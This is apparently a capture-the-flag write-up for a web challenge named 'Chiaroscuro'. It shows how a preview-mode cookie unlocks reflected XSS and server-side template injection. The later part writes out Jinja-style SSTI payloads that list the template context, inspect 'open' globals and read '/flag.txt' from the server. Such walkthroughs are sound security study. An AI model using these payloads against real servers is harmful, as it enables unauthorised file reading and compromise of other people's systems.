# 🟢 Chiaroscuro

<figure><img src="../../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

i see one hint saying `The conservation profile applies additional archival passes that can reveal material not shown in display preview.`

<figure><img src="../../../../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>

it has 2 options let's try Conservation as it was already set on Display Preview

<figure><img src="../../../../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>

many things have changed including visual of the image

you can put both request and response in comparer to see what has changed but there's only one thing worth noting and that is cookie

<figure><img src="../../../../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>

when i put it back to Display cookie changed to display

hint said `The conservation profile applies additional archival passes that can reveal material not shown in display preview.` so i played around cookie in repeater to see what happens like random alphabets, names but didn't had any success(no reflection, no errors) with it so i jumped to next functionality

<figure><img src="../../../../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>

it got reflected now we're gonna do the simple xss testing

<figure><img src="../../../../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>

well no success and i tried different encoding and double encoding but no success

<figure><img src="../../../../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>

changing the cookie to `conservation`  worked and xss was success as the hint said and tbh i tried many things before i land a hit it was not straightforward

now the problem is what i should do with it whom i suppose to send and it's not stored xss also.

i was randomly trying payload from everywhere and got hit with SSTI

<figure><img src="../../../../.gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>

so it has XSS and SSTI vulnerability

<figure><img src="../../../../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>

i tried in display mode where i changed preview\_mode in cookie it didn't work

now there are many payload to try in SSTI some will some work and some will not and there's a path to follow to identify which server-side template they use for now i will post what worked

<figure><img src="../../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

```
{{self}}
```

<figure><img src="../../../../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>

list the name of all the variables used in the context using dictionary's .key() method

```
{{ self._TemplateReference__context.keys() }}
```

<figure><img src="../../../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

```
{{open}}
```

```
{{open.__module__}}
```

<figure><img src="../../../../.gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>

```
{{open.__code__}}
```

<figure><img src="../../../../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

```
{{open.__code__.co_names}}
```

```
{{ open.__globals__['__file__'] }}
```

<figure><img src="../../../../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

```
{{ open.__globals__['ALLOWED_READ_PATHS'] }}
```

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

```
{{ open('/flag.txt').read() }}
```

or

```
{{ open('/flag.txt')}}
```

both works
